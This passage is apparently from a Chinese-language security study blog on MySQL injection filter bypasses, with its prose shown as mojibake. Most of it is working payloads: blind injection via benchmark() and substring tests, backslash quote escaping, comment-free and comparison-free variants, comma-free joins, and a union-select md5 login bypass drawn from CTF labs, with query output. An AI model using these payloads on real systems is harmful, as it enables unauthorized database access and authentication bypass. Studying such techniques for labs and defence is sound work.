<p>åˆ©ç”¨æ–¹å¼ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?id=-1&#x27; or ascii(left(database(),1))=100#</span><br><span class="line">2. ?id=-1&#x27; or ascii(right(database(),1))=100# </span><br><span class="line">æˆ–è€… ?id=-1&#x27; or ascii(right(reverse(database()),1))=100#  // reverse()æ˜¯å­—ç¬¦ä¸²å€’ç½®çš„ä½œç”¨</span><br></pre></td></tr></table></figure></p>
<h3 id="è¿‡æ»¤-sleep">4.2.8. è¿‡æ»¤ sleep</h3>
<p>å¯ä»¥ä½¿ç”¨å†…ç½®å‡½æ•° benchmark() ç»•è¿‡ã€‚</p>
<p>è¯­æ³•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">benchmark(æ‰§è¡Œæ¬¡æ•°, æ‰§è¡Œè¡¨è¾¾å¼)</span><br></pre></td></tr></table></figure></p>
<p>åˆ©ç”¨ï¼šå¤šæ‰§è¡Œå‡ æ¬¡è¡¨è¾¾å¼å°±å¯ä»¥ä½¿è¿”å›æ—¶é—´å»¶è¿Ÿï¼Œå› æ­¤å¯ä»¥ç”¨äºæ—¶é—´ç›²æ³¨ï¼Œåªæ˜¯æ­¤æ—¶æ—¶é—´ä¸å¥½æ§åˆ¶ï¼Œå› ä¸ºæ‰§è¡Œè¡¨è¾¾å¼çš„æ—¶é—´æˆ‘ä»¬æ˜¯ä¸çŸ¥é“çš„ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">and</span> benchmark(<span class="number">1000000000</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">and</span> benchmark(<span class="number">1000000000</span>,<span class="number">1</span>);                                                                   <span class="operator">+</span><span class="comment">---+---+-------------------------------+                                                                           | 1 | 2 | 3 and benchmark(1000000000,1) |                                                                           +---+---+-------------------------------+                                                                           | 1 | 2 |                             0 |                                                                           +---+---+-------------------------------+                                                                           1 row in set (6.70 sec) </span></span><br></pre></td></tr></table></figure>
<h2 id="è¿‡æ»¤å•å¼•å·">4.3. è¿‡æ»¤å•å¼•å·</h2>
<p>ä»¥[[11 Vulnhub Billu_b0x Writeup]]é‡åˆ°çš„é—®é¢˜ä¸ºä¾‹ï¼Œå…³é”®æºç å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line"><span class="variable">$pass</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line"><span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">...</span><br><span class="line"><span class="comment"># æœ€åå°†$runå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢</span></span><br></pre></td></tr></table></figure></p>
<p>é¦–å…ˆå°† $run é‚£å¥ä»£ç ç®€åŒ–ä¸€ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> auth where  pass=<span class="string">&#x27;$pass&#x27;</span> <span class="keyword">and</span> uname=<span class="string">&#x27;$uname&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥åˆ©ç”¨åæ–œæ ç»•è¿‡ï¼Œç»™å‡ºå¦‚ä¸‹payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=or 1=1#&amp;pass=\</span><br></pre></td></tr></table></figure></p>
<p>å°†payloadå¸¦å…¥æŸ¥è¯¢è¯­å¥ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> auth <span class="keyword">where</span> pass<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> uname<span class="operator">=</span><span class="string">&#x27;or 1=1#&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>æ­¤æ—¶åæ–œæ å°†ç¬¬äºŒä¸ªå•å¼•å·ç»™è½¬ä¹‰äº†ï¼Œå› æ­¤å®ƒå¤±å»äº†å•å¼•å·é—­åˆçš„ä½œç”¨ï¼Œä»…ä»…å½“ä½œä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå•å¼•å·å°±ä¼šå’Œç¬¬ä¸‰ä¸ªå•å¼•å·é—­åˆï¼Œæ„æˆ<code>'\' and uname='</code>ï¼Œæ‰€ä»¥æœ€ç»ˆçš„æŸ¥è¯¢ä¿¡æ¯å…¶å®ä¸ºï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> auth <span class="keyword">where</span> pass<span class="operator">=</span><span class="string">&#x27;[æ— æ‰€è°“çš„å†…å®¹]&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="è¿‡æ»¤æ³¨é‡Šç¬¦">4.4. è¿‡æ»¤æ³¨é‡Šç¬¦</h2>
<p>ä¸€èˆ¬payloadéƒ½ä¼šåˆ©ç”¨æ³¨é‡Šç¬¦æ³¨é‡Šæ‰åé¢çš„ä¸€å †å†…å®¹ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure></p>
<p>æ­¤æ—¶åå°è¯­å¥ä¸ºï¼šï¼ˆå‡è®¾ï¼‰ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span># limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœæ³¨é‡Šç¬¦è¢«è¿‡æ»¤ï¼Œæ¯”å¦‚#å’Œ-ï¼Œ+éƒ½è¢«è¿‡æ»¤äº†ã€‚å…¶å®å¯ä»¥ä½¿ç”¨å¦‚ä¸‹payloadç»•è¿‡ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?id=-1&#x27; or 1=1 or &#x27;1</span><br><span class="line">2. ?id=-1&#x27; or &#x27;1=1</span><br><span class="line">3. ?id=-1&#x27; union select 1,2,3,&#x27;4 # åœ¨æœ€åä¸€ä¸ªå­—æ®µå¤„æ·»åŠ å•å¼•å·</span><br></pre></td></tr></table></figure></p>
<p>ä½¿åå°è¯­å¥å˜ä¸ºï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"><span class="number">2.</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1=1&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"><span class="number">3.</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;4&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="è¿‡æ»¤æ¯”è¾ƒç¬¦">4.5. è¿‡æ»¤æ¯”è¾ƒç¬¦</h2>
<h3 id="è¿‡æ»¤">4.5.1. è¿‡æ»¤ =</h3>
<h4 id="like-ç»•è¿‡">4.5.1.1. like ç»•è¿‡</h4>
<p>LIKE æ“ä½œç¬¦ç”¨äºåœ¨ WHERE å­å¥ä¸­æœç´¢åˆ—ä¸­çš„æŒ‡å®šæ¨¡å¼ã€‚</p>
<p>è¯­æ³•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name  <span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> <span class="keyword">pattern</span>;</span><br></pre></td></tr></table></figure></p>
<p>%ä¸ºé€šé…ç¬¦ã€‚G%è¡¨ç¤ºä»¥å­—æ¯Gå¼€å§‹çš„å­—ç¬¦ï¼Œ%Gè¡¨ç¤ºä»¥å­—ç¬¦Gç»“å°¾çš„å­—ç¬¦ï¼Œ%G% è¡¨ç¤ºåŒ…å«Gçš„å­—ç¬¦ã€‚</p>
<p>payloadï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; or 1 like 1#</span></span><br></pre></td></tr></table></figure></p>
<h4 id="in-ç»•è¿‡">4.5.1.2. in ç»•è¿‡</h4>
<p>IN æ“ä½œç¬¦å…è®¸æ‚¨åœ¨ WHERE å­å¥ä¸­è§„å®šå¤šä¸ªå€¼ã€‚</p>
<p>è¯­æ³•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name <span class="keyword">IN</span> (value1,value2,...);</span><br></pre></td></tr></table></figure></p>
<p>payload: <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; or 1 in (1)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æˆ–è€…</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">in</span> (<span class="string">&#x27;1&#x27;</span>)#</span><br></pre></td></tr></table></figure></p>
<h4 id="regexp-ç»•è¿‡">4.5.1.3. regexp ç»•è¿‡</h4>
<p>MySQLä¸­ä½¿ç”¨ regexp æ¥è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚åˆ©ç”¨payloadå¦‚ä¸‹ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; or 1 regexp 1#</span></span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> regexp <span class="number">1</span>#;                                                                    <span class="operator">-</span><span class="operator">&gt;</span> ;                                                                                                                <span class="operator">+</span><span class="comment">------+----------+----------+--------+                                                                                 | id   | username | password | camp   |                                                                                 +------+----------+----------+--------+                                                                                 |    1 | admin    | admin    | admin  |                                                                                 |    2 | root     | root     | root   |                                                                                 |    3 | hdf      | hdf      | common |                                                                                 |    4 | xioazz   | xiozz    | common |                                                                                 |    5 | you      | you      | common |                                                                                 |    6 | run      | run      | common |                                                                                 +------+----------+----------+--------+                                                                                 6 rows in set (0.02 sec)</span></span><br></pre></td></tr></table></figure></p>
<h4 id="ç»•è¿‡">4.5.1.4. &lt;&gt; ç»•è¿‡</h4>
<p>è¿™é‡Œçš„æ„æ€å¹¶ä¸æ˜¯è¯´ä½¿ç”¨2&gt;1è¿™æ ·çš„æ–¹æ³•ç»•è¿‡ï¼Œè€Œæ˜¯ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; or !(1&lt;&gt;1)#</span></span><br></pre></td></tr></table></figure></p>
<p>è¿™æ˜¯å› ä¸º &lt;&gt; ç­‰ä»·äº !=ï¼Œå› æ­¤ !(1&lt;&gt;1)å°±ä¼šç­‰ä»·äº!(1!=1) -&gt; !0 -&gt; 1ï¼Œå› æ­¤æœ€ç»ˆç»“æœä¸ºï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> <span class="operator">!</span>(<span class="number">1</span><span class="operator">&lt;&gt;</span><span class="number">1</span>)#;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span> camp   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span> admin    <span class="operator">|</span> admin  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> root     <span class="operator">|</span> root     <span class="operator">|</span> root   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> hdf      <span class="operator">|</span> hdf      <span class="operator">|</span> common <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> xioazz   <span class="operator">|</span> xiozz    <span class="operator">|</span> common <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span> you      <span class="operator">|</span> you      <span class="operator">|</span> common <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">6</span> <span class="operator">|</span> run      <span class="operator">|</span> run      <span class="operator">|</span> common <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<h3 id="è¿‡æ»¤-1">4.5.2. è¿‡æ»¤ &gt;, &lt;</h3>
<h4 id="greatest-leastç»•è¿‡">4.5.2.1. greatest(), least()ç»•è¿‡</h4>
<p>å¦‚ä¸‹å¸¸ç”¨payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or ascii(substr(database(),1,1))&gt;100</span><br><span class="line">?id=-1&#x27; or ascii(substr(database(),1,1))&lt;128</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœè¢«ç¦ç”¨äº† &gt;, &lt; å¯ä»¥åˆ†åˆ«ç”¨greatest() å’Œ least() ä»£æ›¿ã€‚</p>
<p>è¯­æ³•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">greatest(n1, n2, n3, ...) <span class="operator">-</span><span class="operator">&gt;</span> è¿”å›æœ€å¤§å€¼</span><br><span class="line">least(n1, n2, n3, ...) <span class="operator">-</span><span class="operator">&gt;</span> è¿”å›æœ€å°å€¼</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤ä¸Šè¿°payloadå¯ä»¥ä¿®æ”¹ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or greatest((ascii(substr(database(),1,1))),100)=100</span><br><span class="line">?id=-1&#x27; or least((ascii(substr(database(),1,1))),128)=128</span><br></pre></td></tr></table></figure></p>
<p>ä»¥ç¬¬ä¸€å¥è¯ä¸ºä¾‹è§£é‡Šï¼šå¦‚æœ(ascii(substr(database(),1,1)))&gt;100, é‚£ä¹ˆä½œæ¯”è¾ƒçš„å°±æ˜¯greatest((&gt;100), 100) -&gt; (&gt;100) å°±ä¸ä¼š = 100 ï¼Œä¹Ÿå°±æ˜¯oråé¢å°±æ˜¯0ï¼Œå› æ­¤é¡µé¢é”™è¯¯æ˜¾ç¤ºï¼›åä¹‹ï¼Œå¦‚æœ(ascii(substr(database(),1,1)))&lt;=100ï¼ŒæŠŠä¹ˆæ¯”è¾ƒçš„å°±æ˜¯ greatest((&lt;=100), 100) -&gt; 100 å°± = 100 ï¼Œä¹Ÿå°±æ˜¯oråé¢å°±æ˜¯1ï¼Œå› æ­¤é¡µé¢æ­£ç¡®æ˜¾ç¤ºã€‚</p>
<h4 id="strcmpç»•è¿‡">4.5.2.2. strcmp()ç»•è¿‡</h4>
<p><strong>æ³¨æ„ï¼Œè¯¥å‡½æ•°ä¹Ÿå¯ä»¥åœ¨=è¢«è¿‡æ»¤æ—¶ä½¿ç”¨ã€‚</strong></p>
<p>è¯­æ³•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">strcmp(str1, str2)</span><br></pre></td></tr></table></figure></p>
<p>ä½œç”¨ï¼šå¦‚æœstr1å’Œstr2ä¸€æ ·ï¼Œåˆ™è¿”å›0ï¼›å¦‚æœstr1å°äºstr2ï¼Œåˆ™è¿”å›-1ï¼›å¦åˆ™è¿”å›1ã€‚è¿™é‡Œçš„æ¯”è¾ƒå­—ç¬¦ä¸²ç”¨çš„æ˜¯ASCIIç ï¼Œä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çš„æ¯”è¾ƒã€‚å¦‚æœstr1æ˜¯str2çš„çœŸå­ä¸²ï¼Œå³str1 &lt; str2ï¼Œç›¸åï¼Œstr2æ˜¯str1çš„çœŸå­ä¸²ï¼Œåˆ™str1 &gt; str2ã€‚</p>
<p>å¸¸è§„payloadå¯ä»¥ä¿®æ”¹ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or strcmp((ascii(substr(database(),1,1))), 100)</span><br></pre></td></tr></table></figure></p>
<p>æˆ‘è§‰å¾—è¿™ä¸ªå‡½æ•°ç”¨æ¥ç»•è¿‡=è¢«è¿‡æ»¤ä¼šæ›´å¥½ã€‚</p>
<h4 id="between-and-ç»•è¿‡">4.5.2.3. between and ç»•è¿‡</h4>
<p>è¯­æ³•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">between</span> value1 <span class="keyword">and</span> value2</span><br></pre></td></tr></table></figure></p>
<p>ä½œç”¨ï¼šé€‰å–ä»‹äºä¸¤ä¸ªå€¼ä¹‹é—´çš„æ•°æ®èŒƒå›´å†…çš„å€¼ã€‚è¿™äº›å€¼å¯ä»¥æ˜¯æ•°å€¼ã€æ–‡æœ¬æˆ–è€…æ—¥æœŸã€‚æ³¨æ„ï¼Œä¸¤è¾¹éƒ½æ˜¯é—­åŒºé—´ï¼Œå³<code>[value1, value2]</code>ã€‚</p>
<p>åˆ©ç”¨payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or substr(database(),1,1) between &#x27;t&#x27; and &#x27;t&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">between</span> <span class="string">&#x27;t&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;t&#x27;</span>#;                           <span class="operator">-</span><span class="operator">&gt;</span> ;                                                                                                               <span class="operator">+</span><span class="comment">------+----------+----------+--------+                                                                             | id   | username | password | camp   |                                                                             +------+----------+----------+--------+                                                                             |    1 | admin    | admin    | admin  |                                                                              |    2 | root     | root     | root   |                                                                             |    3 | hdf      | hdf      | common |                                                                              |    4 | xioazz   | xiozz    | common |                                                                              |    5 | you      | you      | common |                                                                              |    6 | run      | run      | common |                                                                              +------+----------+----------+--------+                                                                              6 rows in set (0.00 sec) </span></span><br></pre></td></tr></table></figure></p>
<p>æ„Ÿè§‰ç»•è¿‡=è¢«è¿‡æ»¤æ›´å¥½ç”¨ã€‚</p>
<h2 id="è¿‡æ»¤é€—å·">4.6. è¿‡æ»¤é€—å·</h2>
<p>å¸¸ç”¨çš„payloadä¸­å…³äºå­—ç¬¦ä¸²æˆªå–çš„æ—¶å€™ç»å¸¸ç”¨åˆ°éƒ½å¥½ï¼Œæ¯”å¦‚substr(database(),1,1)ã€‚å¦‚æœé€—å·è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨: str from pos for len <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(database() from 1 for 1)</span><br><span class="line">mid(string from start for length)</span><br><span class="line">mid(string from start) &lt;=&gt; mid(string, start) # è·å–ä»startä½ç½®åˆ°ç»“æŸçš„å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure></p>
<p>è¿˜å¯ä»¥åˆ©ç”¨likeç»•è¿‡ï¼Œæ¯”å¦‚ä¸Šé¢çš„è¯­å¥å¯ä»¥è¿™ä¹ˆå†™ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">database() like &#x27;t%&#x27; # è¿™ä¸ªç»“æœå¯èƒ½ä¸º1ï¼Œä¹Ÿå¯èƒ½ä¸º0ï¼Œçœ‹è¿™æ€ä¹ˆåˆ©ç”¨äº†</span><br></pre></td></tr></table></figure></p>
<p>è¿™ä¸ªç»“æœå¯èƒ½ä¸º1ï¼Œä¹Ÿå¯èƒ½ä¸º0ï¼Œçœ‹è¿™æ€ä¹ˆåˆ©ç”¨äº†</p>
<p>limit pos,len å¯ä»¥å†™ä¸º limit len offset pos (posä»0å¼€å§‹)</p>
<p>è¿˜å¯ä»¥ä½¿ç”¨joinç»•è¿‡ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c; å°±ä¼šç­‰ä»·äº <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">4</span>)d;                                                                                                               <span class="operator">+</span><span class="comment">------+----------+----------+------+                                                                               | id   | username | password | camp |                                                                               +------+----------+----------+------+                                                                               |    1 | 2        | 3        | 4    |                                                                                  +------+----------+----------+------+                                                                                   1 row in set (0.00 sec) </span></span><br></pre></td></tr></table></figure></p>
<h1 id="é‡åˆ°çš„é—®é¢˜">5. é‡åˆ°çš„é—®é¢˜</h1>
<h2 id="mysqlæŸ¥è¯¢æŠ€å·§ç»•è¿‡å¼ºç±»å‹æ¯”è¾ƒ">5.1. MySQLæŸ¥è¯¢æŠ€å·§ç»•è¿‡å¼ºç±»å‹æ¯”è¾ƒ</h2>
<p>é¢˜ç›®ï¼š[[bugku_login2]]</p>
<p>MySQLä¸­è”åˆæŸ¥è¯¢æ—¶å€™è¿”å›çš„å€¼æˆ‘ä»¬æ˜¯èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œæ¯”å¦‚å¸¸è§„çš„ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; unnion select 1,2,3,4;</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆè¿”å›çš„å€¼å°±æ˜¯1ï¼Œ2ï¼Œ3ï¼Œ4ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹1ï¼Œ2ï¼Œ3ï¼Œ4ä½ç½®ä¸Šçš„å€¼ä»è€Œæ§åˆ¶è¿”å›çš„ä¿¡æ¯ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,md5(<span class="number">123</span>),<span class="number">3</span>,<span class="number">4</span>;                                                 <span class="operator">+</span><span class="comment">------+----------------------------------+----------+------+                                                       | id   | username                         | password | camp |                                                       +------+----------------------------------+----------+------+                                                       |    1 | 202cb962ac59075b964b07152d234b70 | 3        | 4    |                                                       +------+----------------------------------+----------+------+                                                       1 row in set (0.00 sec) </span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœåå°è¯­å¥å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===md5(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>ä»ä¸­å¯ä»¥çœ‹åˆ°è¿”å›çš„å­—æ®µæ•°ä¸º2ï¼Œå¹¶ä¸”å¦‚æœè¿”å›ä¸ä¸ºç©ºï¼Œé‚£ä¹ˆå°±è¿›è¡Œå¼ºç±»å‹æ¯”è¾ƒã€‚åœ¨è¿™é¢˜ä¸­ï¼Œæˆ‘ä»¬è‚¯å®šä¸çŸ¥é“å¯†ç æ˜¯å¤šå°‘ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡è”åˆæŸ¥è¯¢æ§åˆ¶è¿”å›çš„passwordå­—æ®µçš„å€¼ä¸ºMD5($password)å³å¯ã€‚</p>
<p>å³ï¼Œè¿”å›çš„ç»“æœä¸ºï¼š</p>
<table>
<thead>
<tr class="header">
<th>username</th>
<th>password</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ä»»æ„</td>
<td>md5($password)</td>
</tr>
</tbody>
</table>
<p>å…¶ä¸­$passwordæ˜¯æˆ‘ä»¬åœ¨è¾“å…¥çš„ã€‚å› æ­¤ï¼Œpayloadå¦‚ä¸‹ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27; union select 1,md5(123)#&amp;password=123</span><br></pre></td></tr></table></figure></p>
<p>å°±å¯ä»¥æˆåŠŸç»•è¿‡å¼ºç±»å‹æ¯”è¾ƒã€‚</p>
<h2 id="mysqlä¸­å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒç‰¹æ€§">5.2. MySQLä¸­å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒç‰¹æ€§</h2>
<h3 id="åŸç†-3">5.2.1. åŸç†</h3>
<p>é¦–å…ˆï¼Œå°†é¦–å­—ç¬¦ä¸ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²è½¬ä¸º0ï¼Œä¸ç®¡å¤šé•¿çš„å­—ç¬¦ä¸²éƒ½ä¼šè¢«è½¬ä¸º0ï¼Œç„¶åå†è·Ÿæ•°å­—è¿›è¡Œæ¯”è¾ƒã€‚æ³¨æ„ï¼Œå¦‚æœé¦–å­—ç¬¦ä¸ºæ•°å­—ï¼Œæˆ–è€…å‰å‡ ä¸ªå­—ç¬¦éƒ½ä¸ºæ•°å­—ï¼Œåˆ™æ•´ä¸ªå­—ç¬¦ä¸²ä¼šè¢«è½¬ä¸ºå¼€å¤´è¿ç»­çš„å‡ ä¸ªæ•°å­—ï¼Œç›´åˆ°ç¢°åˆ°éæ•°å­—ã€‚æ¯”å¦‚<code>123str</code>å°±ä¼šè¢«è½¬ä¸º<code>123</code>ï¼Œæ›´ç”š<code>0123str</code>ä¹Ÿä¼šè¢«è½¬ä¸º<code>123</code>ã€‚</p>
<ol type="1">
<li><p>ä¸€ä¸ªå¼€å¤´æ²¡æœ‰æ•°å­—çš„å­—ç¬¦ä¸²å’Œæ•°å­—0è¿›è¡Œæ¯”è¾ƒä¼šä¸ºçœŸï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428104333.png" /></p></li>
